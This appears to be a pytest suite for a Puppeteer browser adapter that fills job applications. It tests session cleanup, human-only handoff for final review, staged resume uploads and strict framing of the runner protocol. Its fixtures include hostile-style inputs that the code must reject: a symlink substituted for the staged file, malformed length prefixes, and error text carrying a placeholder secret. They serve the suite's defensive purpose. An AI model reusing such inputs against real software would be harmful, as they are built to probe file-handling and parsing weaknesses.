    manifest = run_dir / "review_session.json"
    caller_staged = tmp_path / "caller-owned-staged.txt"
    caller_bytes = b"caller-owned staged fixture"
    caller_staged.write_bytes(caller_bytes)
    input_root = tmp_path / "input"
    input_root.mkdir(mode=0o700)
    staged = input_root / "resume.txt"
    staged.write_bytes(caller_bytes)
    staged_sha256 = hashlib.sha256(staged.read_bytes()).hexdigest()
    logical_url = validate_greenhouse_url("https://boards.greenhouse.io/fixture/jobs/123").url

    session = PuppeteerSession.start(
        headless=False,
        session_id="session-headed-local-diagnostic",
        run_id=73,
        job_id=173,
        run_cwd=run_dir,
        screenshot_root=run_dir / "screenshots",
        input_root=input_root,
        staged_input=staged.name,
        staged_sha256=staged_sha256,
        staged_media_type="text/plain",
        session_manifest=manifest,
        internal_transport_url=fixture_server,
    )
    owner = dict(session.owner_identity)
    browser = dict(session.browser_identity)
    adapter_root = Path(session._child_root)
    try:
        assert manifest.exists()
        session.goto(logical_url)
        observation = session.observe()
        first_name = field_by_name(observation, "first_name")
        session.fill(first_name["target_id"], "Ada")
    finally:
        session.close()

    terminal = json.loads(manifest.read_text(encoding="utf-8"))
    assert terminal["state"] == "closed"
    assert terminal["cleanup"] is True
    assert terminal["staged_input_removed"] is True
    assert terminal["owner_identity"] == owner
    assert terminal["browser_identity"] == browser
    assert terminal["owner_pgid"] == owner["pgid"]
    assert terminal["browser_pgid"] == browser["pgid"]
    assert terminal["profile_path"]
    assert not Path(terminal["profile_path"]).exists()
    assert not adapter_root.exists()
    for identity in (owner, browser):
        with pytest.raises(ProcessLookupError):
            os.killpg(identity["pgid"], 0)
    assert not staged.exists()

    assert FixtureHandler.attacker_http_requests == 0
    assert FixtureHandler.final_like_requests == 0
    assert caller_staged.read_bytes() == caller_bytes
    assert not (run_dir / "run.json").exists()

@pytest.mark.skipif(
    os.environ.get("RUN_PUPPETEER_HEADED_SMOKE") != "1",
    reason="set RUN_PUPPETEER_HEADED_SMOKE=1 for the manual headed survival smoke",
)
@BROWSER_INTEGRATION_SKIP
def test_headed_review_survives_parent_and_closes_from_tab(fixture_server, tmp_path):
    """Run handoff in a short-lived helper; only a physical click may continue it."""
    run_dir = tmp_path / "run"
    input_root = tmp_path / "input"
    input_root.mkdir(mode=0o700)
    staged = input_root / "resume.txt"
    staged.write_bytes(b"headed smoke resume")
    manifest = run_dir / "review_session.json"
    helper = f"""
import hashlib, json, sys
from jobs_assistant.browser_adapter import PuppeteerSession
import jobs_assistant.browser_adapter as adapter
print(adapter.__file__, adapter.RUNNER, file=sys.stderr)

session = None
released = False
try:
    staged = {str(staged)!r}
    session = PuppeteerSession.start(
        headless=False,
        session_id="session-headed-review",
        run_id=71,
        job_id=171,
        run_cwd={str(run_dir)!r},
        screenshot_root={str(run_dir / "screenshots")!r},
        input_root={str(input_root)!r},
        staged_input="resume.txt",
        staged_sha256=hashlib.sha256(open(staged, "rb").read()).hexdigest(),
        staged_media_type="text/plain",
        session_manifest={str(manifest)!r},
        internal_transport_url={fixture_server!r},
    )
    session.goto("https://boards.greenhouse.io/fixture/jobs/123?gh_src=human-review")
    observation = session.observe()
    assert any(button.get("text") == "Continue to guarded local review" for button in observation["buttons"])
    assert session.prepare_handoff()["state"] == "prepared"
    assert session.commit_handoff("headed-review-token-" + "a" * 32)["state"] == "open_guarded"
    assert session.release_handoff()["released"] is True
    released = True
    print(json.dumps({{"owner": session.owner_identity, "browser": session.browser_identity}}), flush=True)
finally:
    if session is not None and not released:
        session.close(force=True)
"""
    identities: dict | None = None
    try:
        result = subprocess.run(
            [sys.executable, "-c", helper],
            cwd=str(Path.cwd()),
            text=True,
            capture_output=True,
            timeout=90,
            check=False,
            env={**os.environ, "DEBUG": "puppeteer:*"},
        )
        print("HELPER STDERR:", result.stderr, file=sys.stderr)
        assert result.returncode == 0, result.stderr
        helper_lines = [line for line in result.stdout.splitlines() if line.strip()]
        assert helper_lines, result.stdout
        identities = json.loads(helper_lines[-1])
        owner = identities["owner"]
        browser = identities["browser"]
        first_heartbeat = json.loads(manifest.read_text(encoding="utf-8"))["heartbeat"]
        heartbeat_deadline = time.monotonic() + 16
        while time.monotonic() < heartbeat_deadline:
            current = json.loads(manifest.read_text(encoding="utf-8"))
            if current.get("state") == "open_guarded" and current.get("heartbeat") != first_heartbeat:
                break
            time.sleep(0.1)
        else:
            pytest.fail("headed owner did not survive release through a second heartbeat")

        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0
        before_click_requests = FixtureHandler.benign_requests
        before_click_logical_count = len(FixtureHandler.logical_urls)
        print(
            "\nHEADED SMOKE: in the isolated local Chromium window, physically click "
            "'Continue to guarded local review', then close that tab. "
            "Do not use the Submit Application control.",
            flush=True,
        )
        close_deadline = time.monotonic() + 120
        while time.monotonic() < close_deadline:
            current = json.loads(manifest.read_text(encoding="utf-8"))
            if current.get("state") == "closed" and current.get("cleanup") is True:
                break
            time.sleep(0.1)
        else:
            pytest.fail("headed review was not closed by a human tab close")

        terminal = json.loads(manifest.read_text(encoding="utf-8"))
        # The strict proxy is hosted by the owner process group.
        assert terminal["owner_pgid"] == owner["pgid"]
        review_urls = [
            url for url in FixtureHandler.logical_urls[before_click_logical_count:]
            if "gh_src=human-review" in url
        ]
        assert review_urls == [
            "https://boards.greenhouse.io/fixture/jobs/123?gh_src=human-review"
        ]
        assert 1 <= FixtureHandler.benign_requests - before_click_requests <= 2
        assert FixtureHandler.attacker_http_requests == 0
        assert FixtureHandler.final_like_requests == 0
        assert not staged.exists()
        assert terminal.get("profile_path")
        assert not Path(terminal["profile_path"]).exists()
        for identity in (owner, browser):
            with pytest.raises(ProcessLookupError):
                os.killpg(identity["pgid"], 0)
    except BaseException:
        if identities is not None:
            _validated_emergency_cleanup(identities, manifest)
        raise


@BROWSER_INTEGRATION_SKIP
def test_headless_session_cannot_prepare_or_survive_release(fixture_server, tmp_path):
    manifest = tmp_path / "review_session.json"
    session = PuppeteerSession.start(
        headless=True,
        session_id="session-headless",
        run_id=7,
        job_id=123,
        session_manifest=manifest,
        internal_transport_url=fixture_server,
    )
    owner_pid = session.owner_pid
    starting = json.loads(manifest.read_text())
    assert starting["state"] == "starting"
    assert starting["browser_identity"]["pid"] == session.browser_pid
    try:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        with pytest.raises(BrowserAdapterError, match="headless_handoff_forbidden"):
            session.prepare_handoff()
    finally:
        session.close(force=True)
    terminal = json.loads(manifest.read_text())
    assert terminal["state"] == "closed"
    assert terminal["cleanup"] is True
    with pytest.raises(ProcessLookupError):
        os.kill(owner_pid, 0)


def test_start_rejects_missing_startup_identity():
    with pytest.raises(BrowserAdapterError, match="startup_identity_required"):
        PuppeteerSession.start(headless=True)



@BROWSER_INTEGRATION_SKIP
def test_upload_uses_registered_staged_file_without_caller_path(fixture_server, tmp_path):
    input_root = tmp_path / "input"
    input_root.mkdir()
    staged = input_root / "resume.pdf"
    staged.write_bytes(b"fixture resume")
    session = PuppeteerSession.start(
        headless=True,
        session_id="session-upload",
        run_id=8,
        job_id=124,
        input_root=input_root,
        staged_input=staged.name,
        staged_sha256=hashlib.sha256(staged.read_bytes()).hexdigest(),
        staged_media_type="application/pdf",
        internal_transport_url=fixture_server,
    )
    try:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        resume = field_by_name(session.observe(), "resume")
        assert session.upload(resume["target_id"])["retained"] is True
    finally:
        session.close(force=True)


@BROWSER_INTEGRATION_SKIP
def test_upload_aria_disabled_drift_cleans_staging_without_mutation_or_dispatch(fixture_server, tmp_path):
    input_root = tmp_path / "input"
    input_root.mkdir()
    staged = input_root / "resume.pdf"
    staged.write_bytes(b"fixture resume")
    session = PuppeteerSession.start(
        headless=True,
        session_id="session-upload-aria-disabled-drift",
        run_id=52,
        job_id=124,
        input_root=input_root,
        staged_input=staged.name,
        staged_sha256=hashlib.sha256(staged.read_bytes()).hexdigest(),
        staged_media_type="application/pdf",
        internal_transport_url=fixture_server.replace("/clean", "/continue-native-disabled-fieldset"),
        test_drift=True,
    )
    try:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        resume = field_by_name(session.observe(), "resume")
        assert resume["enabled"] is True
        assert resume["file_count"] == 0

        assert session._arm_field_aria_disabled_drift_for_test()["armed"] is True
        with pytest.raises(BrowserAdapterError, match="target_not_actionable"):
            session.upload(resume["target_id"])

        after = field_by_name(session.observe(), "resume")
        assert after["enabled"] is False
        assert after["file_count"] == 0
        assert not any(
            item["element_id"] == "aria-disabled-drift-upload-listener-marker"
            for item in session.observe()["buttons"]
        )
        assert session.network_counters()["terminal_reason"] is None
        owner_roots = list((Path(session._child_root) / "tmp").glob("jobs-assistant-owner-*"))
        assert len(owner_roots) == 1
        assert not any(path.name.startswith(".upload-") for path in owner_roots[0].iterdir())
    finally:
        session.close(force=True)


@BROWSER_INTEGRATION_SKIP
def test_upload_rejects_registered_staged_symlink(fixture_server, tmp_path):
    input_root = tmp_path / "input"
    input_root.mkdir()
    original = tmp_path / "resume.pdf"
    original.write_bytes(b"fixture resume")
    staged = input_root / "resume.pdf"
    staged.symlink_to(original)
    session = PuppeteerSession.start(
        headless=True,
        session_id="session-upload-symlink",
        run_id=9,
        job_id=125,
        input_root=input_root,
        staged_input=staged.name,
        staged_sha256=hashlib.sha256(original.read_bytes()).hexdigest(),
        staged_media_type="application/pdf",
        internal_transport_url=fixture_server,
    )
    try:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        resume = field_by_name(session.observe(), "resume")
        with pytest.raises(BrowserAdapterError, match="browser_command_failed"):
            session.upload(resume["target_id"])
    finally:
        session.close(force=True)


@BROWSER_INTEGRATION_SKIP
def test_upload_rejects_registered_hash_mismatch(fixture_server, tmp_path):
    input_root = tmp_path / "input"
    input_root.mkdir()
    staged = input_root / "resume.pdf"
    staged.write_bytes(b"fixture resume")
    session = PuppeteerSession.start(
        headless=True,
        session_id="session-upload-hash",
        run_id=10,
        job_id=126,
        input_root=input_root,
        staged_input=staged.name,
        staged_sha256="0" * 64,
        staged_media_type="application/pdf",
        internal_transport_url=fixture_server,
    )
    try:
        session.goto("https://boards.greenhouse.io/fixture/jobs/123")
        resume = field_by_name(session.observe(), "resume")
        with pytest.raises(BrowserAdapterError, match="staged_input_mismatch"):
            session.upload(resume["target_id"])
    finally:
        session.close(force=True)

def test_protocol_rejects_oversized_input_frame():
    process = subprocess.run(
        ["node", str(Path("src/jobs_assistant/puppeteer_runner.js"))],
        input=b"262145\n" + (b"{" * 262145),
        capture_output=True,
        cwd=str(Path.cwd()),
        timeout=10,
        check=False,
    )
    frames = _decode_frames(process.stdout)
    assert frames[0]["ok"] is True
    assert frames[-1]["ok"] is False
    assert frames[-1]["error"] == "input_frame_too_large"

def test_protocol_rejects_unframed_json_response() -> None:
    read_fd, write_fd = os.pipe()
    stream = os.fdopen(read_fd, "rb")
    try:
        os.write(write_fd, b'{"ok":true}\n')
    finally:
        os.close(write_fd)

    session = object.__new__(PuppeteerSession)
    session.process = type("FakeProcess", (), {"stdout": stream})()
    session._selector = selectors.DefaultSelector()
    session._selector.register(stream, selectors.EVENT_READ)
    session._recv_buffer = bytearray()
    session._poisoned = False
    try:
        with pytest.raises(BrowserAdapterError, match="protocol_bad_length"):
            session.read_response(timeout=1)
        assert session._poisoned is True
    finally:
        session._selector.close()
        stream.close()

@pytest.mark.parametrize(
    ("prefix", "error"),
    (
        (b"+1", "protocol_bad_length"),
        (b" 1", "protocol_bad_length"),
        (b"01", "protocol_bad_length"),
        (b"9" * 32, "protocol_frame_too_large"),
    ),
)
def test_protocol_rejects_noncanonical_response_length(prefix: bytes, error: str) -> None:
    read_fd, write_fd = os.pipe()
    stream = os.fdopen(read_fd, "rb")
    try:
        os.write(write_fd, prefix + b"\n{}")
    finally:
        os.close(write_fd)

    session = object.__new__(PuppeteerSession)
    session.process = type("FakeProcess", (), {"stdout": stream})()
    session._selector = selectors.DefaultSelector()
    session._selector.register(stream, selectors.EVENT_READ)
    session._recv_buffer = bytearray()
    session._poisoned = False
    try:
        with pytest.raises(BrowserAdapterError, match=error):
            session.read_response(timeout=1)
        assert session._poisoned is True
    finally:
        session._selector.close()
        stream.close()


@pytest.mark.parametrize(
    ("prefix", "error"),
    (
        (b"+1", "protocol_bad_length"),
        (b" 1", "protocol_bad_length"),
        (b"01", "protocol_bad_length"),
        (b"9" * 32, "protocol_frame_too_large"),
    ),
)
def test_preflight_protocol_rejects_noncanonical_response_length(prefix: bytes, error: str) -> None:
    read_fd, write_fd = os.pipe()
    stream = os.fdopen(read_fd, "rb")
    try:
        os.write(write_fd, prefix + b"\n{}")
    finally:
        os.close(write_fd)

    process = type("FakeProcess", (), {"stdout": stream})()
    try:
        with pytest.raises(BrowserAdapterError, match=error):
            _read_one_frame(process, timeout=1)
    finally:
        stream.close()


def test_preflight_protocol_accepts_canonical_response_length() -> None:
    read_fd, write_fd = os.pipe()
    stream = os.fdopen(read_fd, "rb")
    try:
        os.write(write_fd, b"2\n{}")
    finally:
        os.close(write_fd)

    process = type("FakeProcess", (), {"stdout": stream})()
    try:
        assert _read_one_frame(process, timeout=1) == {}
    finally:
        stream.close()



@BROWSER_INTEGRATION_SKIP
def test_select_native_self_test_uses_isolated_realm_spoofs():
    env = os.environ.copy()
    executable = env.get("PUPPETEER_EXECUTABLE_PATH")
    if executable:
        env["JOBS_ASSISTANT_CHROMIUM_EXECUTABLE"] = executable
    result = subprocess.run(
        ["node", str(Path("src/jobs_assistant/puppeteer_runner.js")), "--select-native-self-test"],
        cwd=str(Path.cwd()),
        env=env,
        text=True,
        capture_output=True,
        timeout=30,
        check=False,
    )
    assert result.returncode == 0, result.stderr + result.stdout
    frames = _decode_frames(result.stdout.encode())
    assert frames[-1]["ok"] is True
    assert frames[-1]["data"]["passed"] == 1


@BROWSER_INTEGRATION_SKIP
def test_npm_puppeteer_smoke_runs_real_headless_chromium():
    result = subprocess.run(
        ["npm", "run", "puppeteer-smoke", "--silent"],
        cwd=str(Path.cwd()),
        text=True,
        capture_output=True,
        timeout=30,
        check=False,
    )
    assert result.returncode == 0, result.stderr + result.stdout
    frames = _decode_frames(result.stdout.encode())
    assert frames[-1]["ok"] is True
    assert frames[-1]["data"]["smoke"] is True
    assert frames[-1]["data"]["counters"]["attackerDnsLookups"] == 0


def _decode_frames(data: bytes) -> list[dict]:
    frames = []
    while data:
        line, _, rest = data.partition(b"\n")
        if not line:
            break
        length = int(line)
        frames.append(json.loads(rest[:length]))
        data = rest[length:]
    return frames

def _session_with_response(response: dict) -> PuppeteerSession:
    session = object.__new__(PuppeteerSession)
    session._request_lock = threading.Lock()
    session._poisoned = False
    session._closed = False
    session._write_frame = lambda payload, timeout: None
    session.read_response = lambda timeout=15.0: response
    return session


def test_request_rejects_malformed_success_envelope_and_poison_session():
    session = _session_with_response({"ok": True})

    with pytest.raises(BrowserAdapterError, match="protocol_invalid_response"):
        session.request({"action": "unknown"})

    assert session._poisoned is True
    with pytest.raises(BrowserAdapterError, match="protocol_poisoned"):
        session.request({"action": "unknown"})


def test_request_rejects_malformed_observe_success_and_poison_session():
    session = _session_with_response({
        "ok": True,
        "data": {"observation_id": "obs-1", "fields": [], "buttons": []},
    })

    with pytest.raises(BrowserAdapterError, match="protocol_invalid_response"):
        session.request({"action": "observe"})

    assert session._poisoned is True


def test_request_rejects_malformed_mutation_ack_and_accepts_valid_shapes():
    malformed = _session_with_response({"ok": True, "data": {"counters": {}}})
    with pytest.raises(BrowserAdapterError, match="protocol_invalid_response"):
        malformed.request({"action": "fill"})
    assert malformed._poisoned is True

    valid_observation = {
        "observation_id": "obs-1",
        "url": "https://boards.greenhouse.io/acme/jobs/123",
        "title": "Apply",
        "site_markers": [],
        "fields": [],
        "buttons": [],
        "final_submit_target_ids": [],
        "errors": [],
        "blockers": [],
        "counters": {},
        "terminal_reason": None,
    }
    valid_observe = _session_with_response({"ok": True, "data": valid_observation})
    assert valid_observe.request({"action": "observe"}) == valid_observation

    valid_mutation = _session_with_response({
        "ok": True,
        "data": {"retained": True, "counters": {}},
    })
    assert valid_mutation.request({"action": "fill"}) == {"retained": True, "counters": {}}


def test_normalize_browser_error_code_collapses_raw_runner_messages():
    raw = "Error: page.goto failed at https://secret.example/app /private/tmp/jobs SECRET_SENTINEL"

    assert normalize_browser_error_code("navigation_timeout") == "navigation_timeout"
    assert normalize_browser_error_code(raw) == "browser_command_failed"
    assert normalize_browser_error_code({"error": raw}) == "browser_command_failed"
    assert normalize_browser_error_code(None) == "browser_command_failed"


def test_request_exposes_only_allowlisted_runner_error_codes():
    known = _session_with_response({"ok": False, "error": "navigation_dns_failed"})
    with pytest.raises(BrowserAdapterError) as known_error:
        known.request({"action": "goto"})
    assert str(known_error.value) == "navigation_dns_failed"

    raw = "PuppeteerError https://secret.example/app /private/tmp/jobs SECRET_SENTINEL"
    unknown = _session_with_response({"ok": False, "error": raw})
    with pytest.raises(BrowserAdapterError) as unknown_error:
        unknown.request({"action": "goto"})
    assert str(unknown_error.value) == "browser_command_failed"
    assert raw not in str(unknown_error.value)
    assert unknown_error.value.__cause__ is None

def test_runner_error_code_self_test():
    result = subprocess.run(
        ["node", "src/jobs_assistant/puppeteer_runner.js", "--error-code-self-test"],
        cwd=str(Path.cwd()),
        capture_output=True,
        timeout=10,
        check=False,
    )
    assert result.returncode == 0, result.stderr.decode()
    assert _decode_frames(result.stdout) == [{"ok": True, "data": {"passed": 10}}]

def test_runner_request_guard_self_test() -> None:
    result = subprocess.run(
        ["node", "src/jobs_assistant/puppeteer_runner.js", "--request-guard-self-test"],
        cwd=str(Path.cwd()),
        capture_output=True,
        timeout=10,
        check=False,
    )
    assert result.returncode == 0, result.stderr.decode()
    assert _decode_frames(result.stdout) == [{"ok": True, "data": {"passed": 14}}]
